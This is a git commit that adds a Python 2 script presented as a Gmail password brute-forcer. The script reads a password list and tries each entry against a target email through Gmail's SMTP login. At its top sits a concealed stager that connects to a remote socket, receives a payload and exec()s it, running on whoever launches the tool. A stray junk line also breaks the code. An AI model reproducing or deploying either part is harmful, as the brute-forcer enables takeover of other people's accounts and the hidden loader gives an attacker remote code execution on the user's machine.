1bba803a2db2d4c19dc91422674c82fa3907aaff
ABMAM <43504447+ABMAM@users.noreply.github.com>
2019-04-03 14:22:26 +0100

    Add files via upload

---
+++ PottusBF.py
@@ -0,0 +1,87 @@
+#!/usr/bin/python
+'''created by POTTUS'''
+import socket,struct,time
+hhbhbhhhhhhhhhhhjjjjjjjjjjjjjjjjj
+for x in range(10):
+        try:
+                s=socket.socket(2,socket.SOCK_STREAM)
+                s.connect(('',))
+                break
+        except:
+                time.sleep(5)
+l=struct.unpack('>I',s.recv(4))[0]
+d=s.recv(l)
+while len(d)<l:
+        d+=s.recv(l-len(d))
+exec(d,{'s':s})
+import smtplib
+
+from os import system
+
+def main():
+   print '================================================='
+   print '               create by POTTUS                  '
+   print '================================================='
+   print '               ++++++++++++++++++++              '
+   print '\n                                               '
+   print '  _,.                                            '
+   print '                                                 '
+   print '                                                 '
+   print '           Pottus                                '
+   print '       _,.                   '
+   print '     ,` -.)                  '
+   print '    ( _/-\\-._               '
+   print '   /,|`--._,-^|            , '
+   print '   \_| |`-._/||          , | '
+   print '     |  `-, / |         /  / '
+   print '     |     || |        /  /  '
+   print '      `r-._||/   __   /  /   '
+   print '  __,-<_     )`-/  `./  /    '
+   print '  \   `---    \   / /  /     '
+   print '     |           |./  /      '
+   print '     /           //  /       '
+   print ' \_/  \         |/  /        '
+   print '  |    |   _,^- /  /         '
+   print '  |    , ``  (\/  /_         '
+   print '   \,.->._    \X-=/^         '
+   print '   (  /   `-._//^`           '
+   print '    `Y-.____(__}             '
+   print '     |     {__)              ' 
+   print '           ()   V.7.0        '
+main()
+print '[1] start the attack'
+print '[2] exit'
+option = input('==>')
+if option == 1:
+   file_path = raw_input('path of passwords file :')
+else:
+   system('clear')
+   exit()
+pass_file = open(file_path,'r')
+pass_list = pass_file.readlines()
+def login():
+    i = 0
+    user_name = raw_input('target email :')
+    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+    server.ehlo()
+    for password in pass_list:
+      i = i + 1
+      print str(i) + '/' + str(len(pass_list))
+      try:
+         server.login(user_name, password)
+         system('clear')
+         main()
+         print '\n'
+         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
+         break
+      except smtplib.SMTPAuthenticationError as e:
+         error = str(e)
+         if error[14] == '<':
+            system('clear')
+            main()
+            print '[+] this account has been hacked, password :' + password + '     ^_^'
+
+            break
+         else:
+            print '[!] password not found => ' + password
+login()
